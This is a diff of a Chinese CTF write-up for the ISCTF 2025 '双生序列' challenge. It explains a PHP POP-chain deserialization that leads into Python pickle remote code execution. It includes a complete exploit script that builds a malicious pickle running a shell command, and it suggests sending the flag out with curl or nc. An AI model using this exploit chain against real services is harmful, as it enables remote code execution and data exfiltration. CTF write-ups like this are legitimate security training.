@@ -90,35 +90,83 @@ print(r"Follow-your-heart-%23}"+output)
 ```
 
 # [ISCTF 2025] 双生序列
-这道题是 `来签个到吧` 的升级版，是一个涉及PHP和Python两种语言的复杂反序列化链。
+这道题是 `来签个到吧` 的升级版，非常有趣，考察了PHP反序列化和Python反序列化的联动，形成一条完整的攻击链。
 
-## 漏洞分析
-整个利用链分为PHP和Python两个部分。
-### PHP部分
-入口点是`api.php`，这里会从数据库读取note内容并进行反序列化。
+## 源码审计
+
+首先题目给了几个关键的PHP文件源码。
+
+**api.php - PHP反序列化入口**
 ```php
+<?php
+// api.php
+// ...
+$id = $_GET['id'] ?? 0;
+$row = $db->query("SELECT content FROM notes WHERE id=" . intval($id))->fetch(PDO::FETCH_ASSOC);
+
+if (!$row) {
+    echo "喵喵喵?";
+    exit(1);
+}
+
+$content = substr($row["content"], strlen("blueshark:"));
+
 $allowed = ["Writer", "Shark", "Bridge"];
-$o = @unserialize($row["content"], ["allowed_classes" => $allowed]);
+$o = @unserialize($content, ["allowed_classes" => $allowed]);
 
 if (!($o instanceof Bridge)) {
     $cat->OwO();
     exit(1);
 }
-...
-$r = $o->fetch();
-```
-这里的waf限制了只允许`Writer`, `Shark`, `Bridge`三个类。并且最终反序列化的对象必须是`Bridge`。
 
-跟进`Bridge`类：
+$r = $o->fetch();
+echo nl2br(htmlspecialchars($r));
+```
+这是漏洞的起点。它从数据库获取内容，截断"blueshark:"前缀后进行反序列化。`allowed_classes`参数严格限制了我们能使用的类，并且最终对象必须是`Bridge`类的实例。
+
+**classes.php - POP链核心**
 ```php
-class Bridge {
-    public $writer;   
-    public $shark;
-    
-    // ...
+<?php
+class Cat {
+    public function OwO() { echo "喵喵喵?"; }
+}
+
+class Writer extends Cat {
+    public $b64data = "";
+    public $init = "no";
+    private static $secret = 'kaqikaqi'; // 硬编码的密钥
 
     public function fetch() {
-        $next = $this->write; // __get trigger
+        if ($this->init === "init") {
+            @mkdir("/tmp/ssxl", 0777, true);
+        }
+        return file_put_contents("/tmp/ssxl/write.bin", base64_decode($this->b64data));
+    }
+
+    public function __destruct() {
+        $sig = hash_hmac('sha256', $this->b64data, self::$secret);
+        file_put_contents("/tmp/ssxl/write.meta", $sig);
+    }
+}
+
+class Shark extends Cat {
+    public $ser = "";
+
+    public function run() {
+        return file_put_contents("/tmp/ssxl/run.bin", $this->ser);
+    }
+
+    public function __destruct() {
+        $this->run();
+    }
+}
+
+class Bridge extends Cat {
+    public $writer;
+    public $shark;
+
+    public function fetch() {
+        $next = $this->write; // 触发 __get
         if ($next instanceof Shark) {
             return $next;
         }
@@ -130,79 +178,89 @@ class Bridge {
             if (!($this->writer instanceof Writer)){
                 return "喵喵喵?";
             }
-            
             $this->writer->fetch();
             return $this->shark;
         }
     }
 }
-```
-在`fetch()`方法中，访问`$this->write`会触发`__get`魔术方法。`__get`方法中会调用`$this->writer->fetch()`，然后返回`$this->shark`。
-所以我们需要控制`$this->writer`为一个`Writer`对象，`$this->shark`为一个`Shark`对象。
 
-`Writer::fetch()`的作用是写入`/tmp/ssxl/write.bin`和`/tmp/ssxl/write.meta`文件。
-`Shark`对象的作用是写入`/tmp/ssxl/run.bin`文件。
-
-### Python部分
-当我们触发了PHP反序列化链，写入了三个文件后，需要访问`run.php`来触发Python部分。
-```php
-// run.php
-$action = $_GET["action"] ?? "喵喵喵?";
-
-if ($action !== "run") {
-    exit(1);
-}
-
-$binfile = "/tmp/ssxl/run.bin";
-
-$allowed = ["Pytools"];
-$exec = @unserialize($data, ["allowed_classes" => $allowed]);
-// ...
-if (method_exists($exec, "__call")) {
-    $ret = $exec->blueshark(); // __call trigger
-}
-```
-`run.php`会反序列化`/tmp/ssxl/run.bin`，并要求它是一个`Pytools`对象。然后调用一个不存在的方法`blueshark()`，这会触发`Pytools::__call`方法。
-
-```php
-// Pytools class
 class Pytools extends Cat {
-    // ...
+    public function __call($name, $args) {
+        return $this->run();
+    }
     public function run() {
         $cmd = "python3 /var/www/html/pytools.py";
         $out = @shell_exec($cmd . " 2>&1");
         return $out;
     }
-
-    public function __call($name, $args) {
-        return $this->run();
-    }
 }
 ```
-`__call`方法会执行`pytools.py`脚本。
+这里定义了POP链的各个组件。`Bridge`是核心，它的`fetch`方法会触发`__get`魔术方法，从而调用`Writer`的`fetch`方法。在对象销毁时，`Writer`和`Shark`的`__destruct`方法会被调用，分别写入`write.bin`、`write.meta`和`run.bin`。
 
-`pytools.py`脚本的逻辑：
-1.  加载`/tmp/ssxl/write.bin`文件，并尝试将其作为Python pickle反序列化成一个`Set`对象。
-2.  加载`/tmp/ssxl/write.meta`文件。
-3.  使用硬编码的密钥`kaqikaqi`对`write.bin`的内容进行HMAC校验，并与`write.meta`中的签名比对。
-4.  校验成功后，获取`Set`对象的`payload`属性。
-5.  最后，`pickle.loads(payload)`，触发RCE。
+**run.php - Python部分触发器**
+```php
+<?php
+// run.php
+$action = $_GET["action"] ?? "喵喵喵?";
+if ($action !== "run") { exit(1); }
 
-## 攻击流程
-1.  **构造内部Python Pickle**: 构造一个可以RCE的Python Pickle payload。
-2.  **构造外部Python Pickle**: 将RCE payload放入一个`Set`对象(`s`)的`payload`属性中，同时设置`s.secret = b"kaqikaqi"`。然后将这个`Set`对象pickle并base64编码。
-3.  **构造PHP序列化**:
-    -   构造一个`Pytools`对象的PHP序列化字符串，这将是`/tmp/ssxl/run.bin`的内容。
-    -   构造一个`Shark`对象，其属性`ser`为上述`Pytools`序列化字符串。
-    -   构造一个`Writer`对象，其`b64data`属性为步骤2中生成的base64编码字符串。
-    -   将`Writer`和`Shark`对象包装在一个`Bridge`对象中。
-    -   最后序列化这个`Bridge`对象。
-4.  **触发漏洞**:
-    -   将最终的`Bridge`序列化字符串发送到`index.php`，创建一个note。
-    -   访问`api.php`并提供note的id，触发PHP反序列化，写入三个`.bin`和`.meta`文件。
-    -   访问`run.php?action=run`，触发Python脚本执行，最终加载恶意的pickle payload，实现RCE。
+$binfile = "/tmp/ssxl/run.bin";
+if (!file_exists($binfile)) { exit(1); }
+
+$data = file_get_contents($binfile);
+$allowed = ["Pytools"];
+$exec = @unserialize($data, ["allowed_classes" => $allowed]);
+
+if (method_exists($exec, "__call")) {
+    $ret = $exec->blueshark(); // 触发 __call
+}
+```
+该文件反序列化由`Shark`类写入的`run.bin`，得到`Pytools`对象。通过调用一个不存在的方法`blueshark()`来巧妙地触发`__call`魔术方法，从而执行`pytools.py`脚本。
+
+**pytools.py - Python RCE**
+```python
+# pytools.py
+# ... (imports) ...
+class Pytools:
+    # ...
+    def run(self):
+        # ...
+        data = self.load_bin() # 加载 /tmp/ssxl/write.bin
+        meta = self.load_meta() # 加载 /tmp/ssxl/write.meta
+        assert self.sig_check(meta, data) # HMAC 校验
+
+        payload = getattr(obj, 'payload', None)
+
+        if isinstance(payload, (bytes, bytearray)):
+            try:
+                inner = pickle.loads(payload) # RCE 触发点
+            # ...
+```
+这是攻击链的终点。脚本会加载`Writer`写入的`write.bin`和`write.meta`文件，用硬编码的密钥`'kaqikaqi'`进行HMAC签名校验。如果校验通过，它会读取`payload`属性并用`pickle.loads()`执行，从而造成远程代码执行。
+
+## 漏洞利用链
+1.  **入口 (`index.php`)**: 我们需要向`index.php`提交一个精心构造的PHP序列化字符串。这个字符串是一个`Bridge`对象。
+2.  **`Bridge`对象**:
+    *   `writer`属性是一个`Writer`对象。`$writer->b64data`包含我们恶意Python Pickle（`Set`对象）的Base64编码。
+    *   `shark`属性是一个`Shark`对象。`$shark->ser`包含一个`Pytools`对象的PHP序列化字符串。
+3.  **触发PHP反序列化 (`api.php`)**: 访问`api.php?id={note_id}`。
+    *   `unserialize()`被调用，`Bridge`对象被创建。
+    *   `$bridge->fetch()`被调用。
+    *   `Bridge::__get('write')`被触发。
+        *   `$writer->fetch()`被调用，将恶意的Python Pickle数据写入`/tmp/ssxl/write.bin`。
+    *   `Bridge`对象和其属性`$writer`、`$shark`在请求结束时被销毁，触发它们的`__destruct`方法。
+        *   `Writer::__destruct`被调用，计算HMAC签名并写入`/tmp/ssxl/write.meta`。
+        *   `Shark::__destruct`被调用，`$shark->run()`将`Pytools`的序列化字符串写入`/tmp/ssxl/run.bin`。
+4.  **触发Python反序列化 (`run.php`)**: 访问`run.php?action=run`。
+    *   `run.php`读取并反序列化`/tmp/ssxl/run.bin`，得到`Pytools`对象。
+    *   调用不存在的方法`blueshark()`，触发`Pytools::__call`。
+    *   `__call`执行`pytools.py`。
+    *   `pytools.py`读取`write.bin`和`write.meta`，验证HMAC签名。
+    *   签名验证通过后，`pickle.loads()`执行`write.bin`中包含的恶意payload，实现RCE。
 
 ## exp
+这里的exp脚本自动化了整个过程，从构造PHP序列化字符串到触发漏洞，最终获取flag。
+
 ```python
 #!/usr/bin/env python3
 # -*- coding: utf-8 -*-
@@ -211,10 +269,8 @@ import base64
 import pickle
 import requests
 
-TARGET = "http://challenge.bluesharkinfo.com:25507/"  # _TODO: 改成题目给的 URL_
-FLAG_PATH = "/flag"                 # _TODO: 视题目实际情况改_
-
-# === 1. Python 端：构造内外层 Pickle ===
+TARGET = "http://challenge.bluesharkinfo.com:25507/"
+FLAG_PATH = "/flag"
 
 # 本地定义一个同名 Set 类，用来生成外层 pickle
 class Set:
@@ -223,11 +279,11 @@ class Set:
         self.payload = b""
 
 def build_inner_payload():
-    _"""_
-_    构造第二层的恶意 pickle，_
-_    执行命令: cat FLAG_PATH > /tmp/ssxl/outs.txt_
-_    """_
-_    _cmd = f"cat {FLAG_PATH} > /tmp/ssxl/outs.txt"
+    """
+    构造第二层的恶意 pickle，
+    执行命令: cat /flag > /tmp/ssxl/outs.txt
+    """
+    cmd = f"cat {FLAG_PATH} > /tmp/ssxl/outs.txt"
     # 经典：cos\nsystem\n(S'cmd'\ntR.
     payload = (
         b"cos\n"
@@ -238,51 +294,51 @@ _    _cmd = f"cat {FLAG_PATH} > /tmp/ssxl/outs.txt"
     return payload
 
 def build_outer_b64(inner_payload: bytes) -> str:
-    _"""_
-_    构造外层 Set 对象，并 base64 编码给 Writer 使用_
-_    secret 必须等于 Writer::$secret = 'kaqikaqi'_
-_    """_
-_    _s = Set()
+    """
+    构造外层 Set 对象，并 base64 编码给 Writer 使用
+    secret 必须等于 Writer::$secret = 'kaqikaqi'
+    """
+    s = Set()
     s.secret = b"kaqikaqi"  # 和 PHP 里 Writer::secret 一致
     s.payload = inner_payload
 
     raw = pickle.dumps(s)
     return base64.b64encode(raw).decode()
 
-# === 2. PHP 序列化构造辅助 ===
+# === PHP 序列化构造辅助 ===
 
 def php_str(s: str) -> str:
-    _"""构造 s:<len>:"xxx"; 这种段"""_
-_    _return f's:{len(s)}:"{s}";'
+    """构造 s:<len>:"xxx"; 这种段"""
+    return f's:{len(s)}:"{s}";'
 
 def build_pytools_ser() -> str:
-    _"""_
-_    run.bin 中的内容，只需要是一个 Pytools 对象即可_
-_    """_
-_    _return 'O:7:"Pytools":0:{}'
+    """
+    run.bin 中的内容，只需要是一个 Pytools 对象即可
+    """
+    return 'O:7:"Pytools":0:{}'
 
 def build_writer(b64data: str) -> str:
-    _"""_
-_    Writer 对象的序列化_
-_    """_
-_    _props = (
+    """
+    Writer 对象的序列化
+    """
+    props = (
         php_str("b64data") + php_str(b64data) +
         php_str("init")    + php_str("init")
     )
     return f'O:6:"Writer":2:{{{props}}}'
 
 def build_shark(pytools_ser: str) -> str:
-    _"""_
-_    Shark 对象，唯一属性 ser = Pytools 序列化_
-_    """_
-_    _props = php_str("ser") + php_str(pytools_ser)
+    """
+    Shark 对象，唯一属性 ser = Pytools 序列化
+    """
+    props = php_str("ser") + php_str(pytools_ser)
     return f'O:5:"Shark":1:{{{props}}}'
 
 def build_bridge(b64data: str, pytools_ser: str) -> str:
-    _"""_
-_    Bridge(writer, shark) 序列化_
-_    """_
-_    _writer_ser = build_writer(b64data)
+    """
+    Bridge(writer, shark) 序列化
+    """
+    writer_ser = build_writer(b64data)
     shark_ser = build_shark(pytools_ser)
 
     props = (
@@ -291,35 +347,36 @@ _    _writer_ser = build_writer(b64data)
     )
     return f'O:6:"Bridge":2:{{{props}}}'
 
-# === 3. HTTP 交互 ===
+# === HTTP 交互 ===
 
 sess = requests.Session()
 
 def create_note(serialized_bridge: str) -> int:
-    _"""_
-_    步骤 1: POST /index.php 插入 note_
-_    """_
-_    _data = {
+    """
+    步骤 1: POST /index.php 插入 note
+    """
+    data = {
         "s": "blueshark:" + serialized_bridge
     }
     r = sess.post(f"{TARGET}/index.php", data=data)
     print("[*] create_note status:", r.status_code)
+    #  需要手动去页面看id
     note_id = int(input("[?] 请手动输入这条 note 的 id: "))
     return note_id
 
 def trigger_api(note_id: int):
-    _"""_
-_    步骤 2: 访问 /api.php?id=note_id_
-_    """_
-_    _params = {"id": note_id}
+    """
+    步骤 2: 访问 /api.php?id=note_id
+    """
+    params = {"id": note_id}
     r = sess.get(f"{TARGET}/api.php", params=params)
     print("[*] trigger_api status:", r.status_code)
 
 def trigger_run():
-    _"""_
-_    步骤 3: 访问 /run.php?action=run_
-_    """_
-_    _params = {"action": "run"}
+    """
+    步骤 3: 访问 /run.php?action=run
+    """
+    params = {"action": "run"}
     r = sess.get(f"{TARGET}/run.php", params=params)
     print("[*] trigger_run status:", r.status_code)
     print(r.text)
@@ -335,9 +392,9 @@ def main():
     note_id = create_note(bridge_ser)
     trigger_api(note_id)
     trigger_run()
+    print("[*] 攻击完成，请检查 /tmp/ssxl/outs.txt 文件内容。")
 
 if __name__ == "__main__":
     main()
 ```
-这个脚本自动化了整个攻击流程。
-
+最终，payload会将flag输出到`/tmp/ssxl/outs.txt`。需要想办法读取该文件，例如修改`build_inner_payload`中的命令，使用`curl`或`nc`将文件内容外带。
